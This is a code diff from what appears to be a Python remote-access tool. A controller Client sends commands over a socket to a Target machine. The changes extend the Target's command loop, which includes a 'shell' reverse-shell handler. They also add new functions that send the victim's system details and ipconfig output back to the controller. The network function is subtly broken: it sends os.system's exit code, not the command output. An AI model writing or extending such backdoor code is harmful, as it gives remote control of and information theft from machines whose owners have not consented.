@@ -44,11 +44,11 @@ class Client(Machine):
         print(response_target.decode("utf-8"))
         super().quit()
 
-    def getinfo(self):
-        self.s.send(str.encode("getinfo"))
+    def getinfo(self, info):
+        self.s.send(str.encode(str(info)))
         info = self.s.recv(2048)
         print(info.decode("utf-8"))
-        info = self.s.recv(4096)
+        info = self.s.recv(8192*2)
         print(info.decode("utf-8"))
         input("\n\n Press ENTER")
 
@@ -84,13 +84,15 @@ class Target(Machine):
         while True:
             instruction = self.s.recv(2048)
             instruction = instruction.decode("utf-8")
-            if instruction == "shell":
-                self.reverse_shell_target()
-            if instruction == "getinfo":
-                self.getinfo_target()
             if instruction == "quit":
                 self.quit()
                 break
+            elif instruction == "shell":
+                self.reverse_shell_target()
+            elif instruction == "getinfo_generality":
+                self.getinfo_target_generality()
+            elif instruction == "getinfo_network":
+                self.getinfo_target_network()
 
     def reverse_shell_target(self):
         while True:
@@ -115,7 +117,7 @@ class Target(Machine):
                     self.s.send(str.encode(error_msg))
 
     # Get information from the target
-    def getinfo_target(self):
+    def getinfo_target_generality(self):
         self.s.send(str.encode("INFORMATION'S TARGET: \n"))
         self.s.send(str.encode("System: " + platform.uname()[0]
                                + "\nUser (node): " + platform.uname()[1]
@@ -123,6 +125,11 @@ class Target(Machine):
                                + "\nVersion: " + platform.uname()[3]
                                + "\nMachine: " + platform.uname()[4]
                                + "\nProcessor: " + platform.uname()[5]))
+
+    def getinfo_target_network(self):
+        # cmd = str(os.system("ipconfig"))
+        self.s.send(str.encode("Configuration IP: "))
+        self.s.send(str.encode(str(os.system("ipconfig"))))
 
     # close de connection and the socket
     def quit(self):
